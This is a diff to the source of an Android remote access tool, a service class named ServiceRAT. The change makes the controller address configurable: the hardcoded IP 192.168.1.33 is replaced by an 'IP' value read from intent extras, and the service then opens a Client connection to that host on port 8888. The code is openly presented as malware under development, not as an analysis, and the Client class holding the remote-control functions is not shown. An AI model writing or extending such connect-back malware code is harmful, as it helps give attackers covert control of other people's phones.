@@ -5,12 +5,13 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.os.AsyncTask;
+import android.os.Bundle;
 import android.os.IBinder;
 import android.view.View;
 import android.widget.Toast;
 
 public class ServiceRAT extends IntentService {
-    private static final String hostname = "192.168.1.33";
+    private String hostname;
     private static final int portnumber = 8888;
 
     public ServiceRAT() {
@@ -33,7 +34,7 @@ public class ServiceRAT extends IntentService {
     public void onDestroy() {
         super.onDestroy();
         Toast.makeText(this, "Servicio destruído!", Toast.LENGTH_SHORT).show();
-        System.out.println("Servicio creado");
+        System.out.println("Servicio creado ");
     }
 
     @Override
@@ -48,7 +49,11 @@ public class ServiceRAT extends IntentService {
 
     @Override
     protected void onHandleIntent(Intent intent) {
+        Bundle extras = intent.getExtras();
+        if(extras != null){
+            hostname = (String) extras.get("IP");
+        }
+        System.out.println("ip " + hostname);
         Client client = new Client(hostname, portnumber, this);
     }
-
 }
